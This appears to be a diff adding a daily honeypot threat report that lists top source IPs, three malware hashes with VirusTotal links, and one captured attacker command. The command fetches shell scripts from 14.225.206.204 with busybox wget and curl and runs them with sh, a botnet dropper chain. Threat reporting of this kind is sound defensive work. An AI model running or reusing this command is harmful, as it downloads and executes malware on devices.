@@ -1,0 +1,19 @@
+Top 5 IPs for 2023-11-30:
+151.245.68.155
+219.85.59.58
+8.134.76.224
+217.208.192.205
+138.19.112.248
+
+Top malware seen: 
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+https://www.virustotal.com/gui/file/63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+
+Malicious commands seen:
+
+cd /data/local/tmp/; busybox wget http://14.225.206.204/w.sh; sh w.sh; curl http://14.225.206.204/c.sh; sh c.sh; wget http://14.225.206.204/wget.sh; sh wget.sh; curl http://14.225.206.204/wget.sh; sh wget.sh; busybox wget http://14.225.206.204/wget.sh; sh wget.sh; busybox curl http://14.225.206.204/wget.sh; sh wget.sh
